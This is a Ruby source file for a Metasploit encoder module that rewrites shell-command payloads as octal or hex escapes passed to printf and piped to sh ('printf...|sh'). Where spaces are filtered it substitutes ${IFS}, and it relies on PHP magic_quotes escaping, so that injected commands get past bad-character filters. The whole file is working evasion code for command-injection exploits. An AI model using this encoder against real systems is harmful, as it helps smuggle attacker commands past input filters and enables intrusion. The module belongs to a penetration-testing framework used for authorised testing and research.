##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Encoder

  # Has some issues, but overall it's pretty good
  # - printf(1) may not be available
  # - requires: "\x7c\x73\x68\x5c\x78"
  # - doesn't work on windows
  # - min size increase: 4x + 9
  # - max size increase: 4x + 14
  # However, because it intentionally leaves backslashes unescaped (assuming
  # that PHP's magic_quotes_gpc will take care of escaping them) it is
  # unsuitable for most exploits.
  Rank = ManualRanking

  def initialize
    super(
      'Name'             => 'printf(1) via PHP magic_quotes Utility Command Encoder',
      'Description'      => %q{
          This encoder uses the printf(1) utility to avoid restricted
        characters. Some shell variable substituion may also be used
        if needed symbols are blacklisted. Some characters are intentionally
        left unescaped since it is assummed that PHP with magic_quotes_gpc
        enabled will escape them during request handling.
      },
      'Author'           => 'jduck',
      'Arch'             => ARCH_CMD,
      'Platform'         => 'unix',
      'EncoderType'      => Msf::Encoder::Type::PrintfPHPMagicQuotes)
  end


  #
  # Encodes the payload
  #
  def encode_block(state, buf)

    # Skip encoding for empty badchars
    if(state.badchars.length == 0)
      return buf
    end

    # If backslash is bad, we are screwed.
    if (state.badchars.include?("\\")) or
      (state.badchars.include?("|")) or
      # We must have at least ONE of these two..
      (state.badchars.include?("x") and state.badchars.include?("0"))
      raise RuntimeError
    end

    # Now we build a string of the original payload with bad characters
    # into \0<NNN> or \x<HH>
    if (state.badchars.include?('x'))
      hex = buf.unpack('C*').collect { |c| "\\0%o" % c }.join
    else
      hex = buf.unpack('C*').collect { |c| "\\x%x" % c }.join
    end

    # Build the final output
    ret = "printf"

    # Special case: <SPACE>, try to use ${IFS}
    if (state.badchars.include?(" "))
      ret << '${IFS}'
    else
      ret << " "
    end

    ret << hex << "|sh"

    return ret
  end

end
